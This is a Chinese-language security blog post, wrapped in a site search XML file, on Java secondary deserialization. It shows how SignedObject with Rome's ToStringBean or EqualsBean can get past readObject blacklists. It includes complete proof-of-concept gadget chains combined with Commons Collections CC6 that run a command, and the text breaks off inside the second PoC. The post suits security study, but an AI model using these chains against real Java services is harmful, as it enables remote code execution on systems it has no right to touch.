<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java二次反序列化</title>
      <link href="/2026/02/02/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2026/02/02/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java二次反序列化"><a href="#Java二次反序列化" class="headerlink" title="Java二次反序列化"></a>Java二次反序列化</h1><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>二次反序列化常用于绕过第一次<code>readObject()</code>时的黑名单机制，用于反序列化出一个题目认为安全的对象，但是经过一些列方法调用会再次触发一次<code>readObject()</code>，此时的反序列化便不再有任何限制了</p><p>此外，一些题目可能会重写<code>readObject()</code>逻辑，原生的<code>ObjectInputStream</code>类中，<code>readObject()</code>方法后面会调用<code>resolveClass()</code>方法进行类加载，一般使用<code>Class.forName()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Class.forName()</code>方法几乎可以在运行时加载任何类，是默认的反序列化类加载方法，但是有些题目可能会使用自定义的类加载，使用<code>loadClass()</code>方法加载类，比如下面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">        URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();</span><br><span class="line">        <span class="built_in">this</span>.classLoader = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="built_in">this</span>.classLoader.loadClass(desc.getName());</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>loadClass()</code>的弊端在于，<code>URLClassLoader</code>使用<code>findClass()</code>从.class字节码文件中加载类，而Java的基本类型如数组是在虚拟机启动时内建，没有所谓的字节码文件供<code>findClass()</code>查找，就无法加载数组类。而几乎所有反序列化链的终点如<code>TemplatesImpl</code>（字节数组加载类）、<code>ChainedTransformer</code>（Transformer数组链式调用）都使用了数组，导致其限制了反序列化攻击</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                        <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, acc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br/><h2 id="二次反序列化绕过"><a href="#二次反序列化绕过" class="headerlink" title="二次反序列化绕过"></a>二次反序列化绕过</h2><p>经过前面的分析，我们若想要继续构造Gadget链，要么完全避免使用数组类，而这几乎是不可能的。那就只能寻找再次触发<code>readObject()</code>机会，即二次反序列化</p><h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><p>该类二次反序列化了一个字节数组，故只能用于黑名单绕过</p><p>在该类的<code>getObject()</code>方法中，进行了一次反序列化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">        <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">        b.close();</span><br><span class="line">        a.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>cotent</code>的声明<code>getObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] content;</span><br></pre></td></tr></table></figure><p>接下来看如何调用到</p><h4 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h4><p>该路线依赖<code>ToStringBean</code>类，是Rome依赖下的类。<code>ToStringBean.toString(String)</code>内有反射调用getter方法的逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">            <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                    <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);</span><br><span class="line">                        <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="built_in">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + ex.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该段代码通过反射调用了<code>_obj</code>字段的getter方法，让<code>_obj</code>为<code>SignedObject</code>，就会触发其所有的getter方法，自然就有<code>getObject()</code></p><p><code>ToStringBean.toString(String)</code>又被<code>ToStringBean.toString()</code>调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Stack</span> <span class="variable">stack</span> <span class="operator">=</span> (Stack)PREFIX_TL.get();</span><br><span class="line">        String[] tsInfo = (String[])(stack.isEmpty() ? <span class="literal">null</span> : stack.peek());</span><br><span class="line">        String prefix;</span><br><span class="line">        <span class="keyword">if</span> (tsInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="built_in">this</span>._obj.getClass().getName();</span><br><span class="line">            prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">            tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.toString(prefix);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>已经可以结束了，使用<code>BadAttributeValueExpException</code> 作为入口类即可，这已经讲过很多次了</p><p>所以触发二次反序列化的Poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">kpg.initialize(<span class="number">2048</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ToStringBean</span>(signedObject.getClass(), signedObject);</span><br><span class="line"></span><br><span class="line">val.set(badAttributeValueExpException, toStringBean);</span><br></pre></td></tr></table></figure><p>这里的evilObject就是真正反序列化出来执行恶意方法的类</p><p>比如，与CC6结合的Poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">2048</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashSet, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ToStringBean</span>(signedObject.getClass(), signedObject);</span><br><span class="line"></span><br><span class="line">        val.set(badAttributeValueExpException, toStringBean);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于<code>toString()</code>的触发，其实还有挺多线路，但是<code>BadAttributeValueExpException</code>起点已经足够简单</p><h4 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h4><p>该类也是Rome依赖下的，<code>EqualsBean.beanEquals()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beanEquals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bean1</span> <span class="operator">=</span> <span class="built_in">this</span>._obj;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bean2</span> <span class="operator">=</span> obj;</span><br><span class="line">        <span class="type">boolean</span> eq;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            eq = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 == <span class="literal">null</span> &amp;&amp; obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            eq = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>._beanClass.isInstance(obj)) &#123;</span><br><span class="line">                eq = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                eq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">                    <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; eq &amp;&amp; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                            <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                            <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> pReadMethod.invoke(bean1, NO_PARAMS);</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> pReadMethod.invoke(bean2, NO_PARAMS);</span><br><span class="line">                                eq = <span class="built_in">this</span>.doEquals(value1, value2);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Could not execute equals()&quot;</span>, ex);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            eq = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> eq;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里几乎和上一个ToStringBean如出一辙，也是getter方法调用到<code>SignedObject.getObject()</code>，该方法的上层为<code>EqualsBean.equals()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.beanEquals(obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续往上，找到<code>Hashtable.readObject()</code>，CC7研究过，该方法一路调用到了<code>equals()</code></p><p>结合CC6的Poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">2048</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject=<span class="keyword">new</span> <span 